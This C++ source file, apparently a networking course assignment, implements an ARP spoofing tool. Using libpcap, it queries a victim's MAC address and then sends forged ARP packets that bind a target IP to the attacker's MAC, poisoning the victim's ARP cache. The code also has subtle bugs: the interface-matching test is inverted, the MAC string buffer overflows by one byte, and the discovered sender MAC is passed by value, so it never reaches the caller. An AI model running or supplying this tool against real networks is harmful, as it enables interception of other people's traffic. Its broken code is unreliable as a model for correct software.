#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <unistd.h>
#include <pcap.h>
#include <netinet/in.h>
#include "mac.h"
#include "ip.h"
#include "arphdr.h"
#include "ethhdr.h"

using namespace std;

void usage() {
	printf("syntax: syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct {
	char* dev_;
} Param;

Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]){
	if((argc%2 == 1)||argc<3){
		usage();
		return false;
	}	
	param->dev_= argv[1];
	return true;
}


string get_mac_address(char* dev) {
    int socket_fd;
    int count_if;

    struct ifreq  *t_if_req;
    struct ifconf  t_if_conf;

    char arr_mac_addr[17] = {0x00, };

    memset(&t_if_conf, 0, sizeof(t_if_conf));

    t_if_conf.ifc_ifcu.ifcu_req = NULL;
    t_if_conf.ifc_len = 0;

    if( (socket_fd = socket(PF_INET, SOCK_DGRAM, 0)) < 0 ) {
        return "";
    }

    if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) {
        return "";
    }

    if( (t_if_req = (ifreq *)malloc(t_if_conf.ifc_len)) == NULL ) {
        close(socket_fd);
        free(t_if_req);
        return "";

    } else {
        t_if_conf.ifc_ifcu.ifcu_req = t_if_req;
        if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) {
            close(socket_fd);
            free(t_if_req);
            return "";
        }

        count_if = t_if_conf.ifc_len / sizeof(struct ifreq);
        for( int idx = 0; idx < count_if; idx++ ) {
            struct ifreq *req = &t_if_req[idx];

            if( !strcmp(req->ifr_name, dev) ) {
                continue;
            }

            if( ioctl(socket_fd, SIOCGIFHWADDR, req) < 0 ) {
                break;
            }

            sprintf(arr_mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x",
                    (unsigned char)req->ifr_hwaddr.sa_data[0],
                    (unsigned char)req->ifr_hwaddr.sa_data[1],
                    (unsigned char)req->ifr_hwaddr.sa_data[2],
                    (unsigned char)req->ifr_hwaddr.sa_data[3],
                    (unsigned char)req->ifr_hwaddr.sa_data[4],
                    (unsigned char)req->ifr_hwaddr.sa_data[5]);
            break;
        }
    }

    close(socket_fd);
    free(t_if_req);
    
    return arr_mac_addr;
}

string get_ip_address(char* dev){
    struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	} else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
				ipstr,sizeof(struct sockaddr));
	}

	return ipstr;

}

bool get_sender_mac(char* dev,Mac my_mac,Ip my_ip,Mac sender_mac,Ip sender_ip){

    char errbuf[512];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	    if (handle == nullptr) {
		    fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		    return false;
	    }
    EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(my_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	bool res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
    
    struct pcap_pkthdr* header;
    const u_char* pcap;
    EthArpPacket* etharp;

    while(true){
    int res = pcap_next_ex(handle, &header, &pcap);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

        etharp = (struct EthArpPacket* )pcap;

		if (ntohs(etharp->eth_.type_) == 0x0806) {
            if(etharp->arp_.sip_ == sender_ip){
                sender_mac = Mac(etharp->arp_.smac_);
                break;
            }
        }
    }
	pcap_close(handle);

    return true;
}

bool send_arp_packet(char* dev,Mac my_mac,Ip target_ip,Mac sender_mac,Ip sender_ip){

    char errbuf[512];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return false;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac(sender_mac);
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
    return true;
}

int main(int argc, char* argv[]){
    // 입력 개수를 검사
	// if(!parse(&param,argc,argv)) return 1;
	// int cnt = (argc-2)/2;

    // 입력 받은 인터페이스의 mac 주소와 ip를 가져오는 부분
	Mac	my_mac,sender_mac;
    Ip my_ip;
    char* dev = argv[1];
    Ip sender_ip = Ip(argv[2]),target_ip = Ip(argv[3]);

    my_mac = Mac(get_mac_address(dev));
    my_ip = Ip(get_ip_address(dev));

    // 패킷을 이용해 sender의 mac 주소를 가져오는 부분
    if(!get_sender_mac(dev,my_mac,my_ip,sender_mac,sender_ip)){
        cout<<"Get_sender_mac Error\n";
        return -1;
    } 

    // 정보들을 이용해 패킷을 위조하고 전송하는 부분
    if(!send_arp_packet(dev,my_mac,target_ip,sender_mac,sender_ip)){
        cout<<"Send_arp_packet Error\n";
        return -1;
    }


    return 0;
}